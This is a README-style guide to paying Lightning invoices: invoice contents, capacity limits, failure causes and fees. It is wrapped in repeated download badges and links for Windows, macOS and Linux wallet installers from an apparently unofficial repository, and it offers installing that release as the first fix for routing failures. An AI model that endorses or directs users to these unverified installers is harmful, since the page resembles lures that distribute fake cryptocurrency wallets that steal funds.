<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>

# How to send a Lightning payment, step by step

Paste the invoice, read what the wallet decodes, confirm once, and know what a failure means.

<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe">lightning-pay-wallet-windows-v1.2.1.exe</a> |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg">lightning-pay-wallet-macos-v1.2.1.dmg</a> |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip">lightning-pay-wallet-linux-v1.2.1.zip</a> |

</div>

Every file above is published on <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1">the Lightning Pay Wallet release page</a> under the same names, and that page is the only place the installers should come from.

> **Only download from this GitHub release page.**

Sending a Lightning payment is a single action with three checks in front of it. The invoice is the
instruction, the wallet shows you what it decoded, and the confirmation is final. Everything that
goes wrong later happens because one of those three steps was skipped.

## What an invoice actually contains

A Lightning invoice is a payment request encoded as a long string that begins with `lnbc`. It carries
the amount, a payment hash that identifies this specific request, the destination node, and an expiry.
It is not a bitcoin address. You cannot send an on-chain transaction to it, and you cannot reuse it
after it has been paid or after it has expired.

That matters because invoices get pasted into chat windows, tickets and notes. A request that was
fresh an hour ago may be dead now, and the wallet will tell you so before any money moves.

## Paying an invoice

Open the send screen, paste the invoice, and read the screen before confirming. The wallet decodes
the amount and the description the recipient attached; the description is the only context you will
get, and it comes from the person asking for money, not from the wallet.

Three things are worth a second look. The amount is fixed by the invoice, so a figure larger than you
expected is a reason to stop rather than a reason to adjust. The description should match who you
think you are paying. And a successful payment is final: Lightning has no chargeback and no reversal,
so a mistake is a conversation with the recipient, not a support ticket.

## Limits you cannot argue with

A payment larger than your outbound channel capacity fails even when your balance covers it. Capacity
is not the same as balance, and the difference surprises people who have just funded a wallet and
expect the whole amount to move.

A wallet may also refuse to empty completely. Closing a channel costs an on-chain fee, so the wallet
keeps a reserve behind to pay it. A balance that will not reach zero is that reserve, not a fault.

## When the payment fails

A failed Lightning payment is a routing result, not a wallet malfunction. The network could not find
a path with enough capacity, the invoice had expired, or a node on the only available route was
offline. The wallet reports which, and there is no setting that invents a route that does not exist.

Start with <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1">install the current release</a>: routing and fee estimation change with every version,
and an old build fails on paths a current one takes. Then ask for a fresh invoice, confirm the
recipient is online, and try a smaller amount if a large one keeps failing.

The full set of failure messages, including the ones that are not really failures, is covered in
<a href="https://github.com/bitcoin-lightning-wallet/lightning-payments-guides/blob/HEAD/why-a-lightning-payment-fails-or-sticks.md">why a Lightning payment fails</a>.

## What it costs

A payment inside an open channel pays a routing fee, usually a fraction of a satoshi. Opening the
channel in the first place is an on-chain transaction that pays an on-chain fee. Both are set out in
<a href="https://github.com/bitcoin-lightning-wallet/lightning-payments-guides/blob/HEAD/what-a-lightning-payment-costs.md">what a Lightning payment costs</a>.

## Questions people ask

### Can I cancel a payment I just sent?

No. A sent Lightning payment cannot be recalled by the sender. It either completes or fails back on
its own, and a payment that looks stuck is waiting on the network, not on you.

### Why does a payment below my balance fail?

Because capacity is not balance. If your spendable balance sits on the receiving side of a channel,
you can hold it and still be unable to send it until the wallet rebalances or opens a new channel.

### Can I send to a bitcoin address instead?

Only with an on-chain send. A bitcoin address cannot receive a Lightning payment, and an invoice
cannot receive an on-chain one. The two rails are separate and a mismatch is not reversible.

## Related guides

- <a href="https://github.com/bitcoin-lightning-wallet/lightning-payments-guides/blob/HEAD/receive-a-lightning-payment-and-read-an-invoice.md">How to receive a Lightning payment and read the invoice</a>

